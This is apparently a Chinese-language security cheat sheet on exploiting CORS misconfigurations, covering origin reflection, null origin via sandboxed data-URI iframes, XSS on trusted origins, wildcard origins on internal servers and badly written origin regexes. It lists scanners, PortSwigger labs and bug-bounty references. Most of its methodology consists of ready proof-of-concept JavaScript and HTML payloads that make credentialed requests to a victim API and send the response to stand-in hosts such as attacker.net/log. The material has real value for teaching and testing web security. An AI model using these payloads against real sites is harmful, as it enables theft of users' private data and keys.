# CORS 配置错误

[原文文档](README.en.md)

> API 域存在全站 CORS 配置错误。这允许攻击者代表用户发出跨域请求，因为应用程序没有白名单 Origin 头并具有 Access-Control-Allow-Credentials: true，这意味着我们可以使用受害者的凭证从攻击者的网站发出请求。

## 概要

* [工具](#工具)
* [要求](#要求)
* [方法论](#方法论)
    * [Origin 反射](#origin-反射)
    * [空 Origin](#空-origin)
    * [受信任 Origin 上的 XSS](#受信任-origin-上的-xss)
    * [不带凭证的通配符 Origin](#不带凭证的通配符-origin)
    * [扩展 Origin](#扩展-origin)
* [实验室](#实验室)
* [参考资料](#参考资料)

## 工具

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS 配置错误扫描器
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - 快速 CORS 配置错误漏洞扫描器
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC 构建器
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - 利用内部网络上的 CORS 配置错误
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - 快速 CORS 配置错误发现工具

## 要求

* 攻击者头：`Origin: https://evil.com`
* 受害者头：`Access-Control-Allow-Credential: true`
* 受害者头：`Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`

## 方法论

通常您想要针对 API 端点。使用以下载荷在目标 `https://victim.example.com/endpoint` 上利用 CORS 配置错误。

### Origin 反射

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证

此 PoC 要求相应的 JS 脚本托管在 `evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

或者

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">利用</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### 空 Origin

#### 易受攻击的实现

服务器可能不会反射完整的 `Origin` 头，但允许 `null` origin。这在服务器的响应中看起来像这样：

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证

可以通过使用 data URI 方案将攻击代码放入 iframe 来利用此漏洞。如果使用 data URI 方案，浏览器将在请求中使用 `null` origin：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### 受信任 Origin 上的 XSS

如果应用程序确实实现了受信任 Origin 的严格白名单，上面的利用代码将不起作用。但如果您在受信任的 Origin 上有 XSS，您可以注入上面的利用代码来再次利用 CORS。

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

### 不带凭证的通配符 Origin

如果服务器响应通配符 origin `*`，**浏览器永远不会发送 cookie**。但是，如果服务器不需要身份验证，仍然可以访问服务器上的数据。这可能发生在不能从互联网访问的内部服务器上。攻击者的网站然后可以渗透到内部网络并在没有身份验证的情况下访问服务器的数据。

```powershell
* 是唯一的通配符 origin
https://*.example.com 无效
```

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### 概念验证

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### 扩展 Origin

有时，原始 Origin 的某些扩展不会在服务器端被过滤。这可能是由于使用实现不良的正则表达式来验证 origin 头造成的。

#### 易受攻击的实现（示例 1）

在这种情况下，插入到 `example.com` 之前的任何前缀都将被服务器接受。

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证（示例 1）

此 PoC 要求相应的 JS 脚本托管在 `evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### 易受攻击的实现（示例 2）

在这种情况下，服务器使用正则表达式，其中点未正确转义。例如，类似这样的东西：`^api.example.com$` 而不是 `^api\.example.com$`。因此，点可以用任何字母替换以从第三方域获得访问。

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### 概念验证（示例 2）

此 PoC 要求相应的 JS 脚本托管在 `apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

## 实验室

* [PortSwigger - 基本 Origin 反射攻击的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - 受信任空 Origin 白名单攻击的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - 受信任不安全协议的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - 内部网络渗透攻击的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## 参考资料

* [[██████] 跨源资源共享配置错误 (CORS) - Vadim (jarvis7) - 2018年12月20日](https://hackerone.com/reports/470298)
* [高级 CORS 利用技术 - Corben Leo - 2018年6月16日](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
* [CORS 配置错误 | 账户接管 - Rohan (nahoragg) - 2018年10月20日](https://hackerone.com/reports/426147)
* [CORS 配置错误导致私人信息泄露 - sandh0t (sandh0t) - 2018年10月29日](https://hackerone.com/reports/430249)
* [www.zomato.com 上的 CORS 配置错误 - James Kettle (albinowax) - 2016年9月15日](https://hackerone.com/reports/168574)
* [CORS 配置错误解释 - Detectify 博客 - 2018年4月26日](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [跨源资源共享 (CORS) - PortSwigger Web 安全学院 - 2019年12月30日](https://portswigger.net/web-security/cors)
* [跨源资源共享配置错误 | 窃取用户信息 - bughunterboy (bughunterboy) - 2017年6月1日](https://hackerone.com/reports/235200)
* [利用 CORS 配置错误获取比特币和赏金 - James Kettle - 2016年10月14日](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [利用配置错误的 CORS（跨源资源共享） - Geekboy - 2016年12月16日](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [跳出范围思考：高级 CORS 利用技术 - Ayoub Safa (Sandh0t) - 2019年5月14日](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)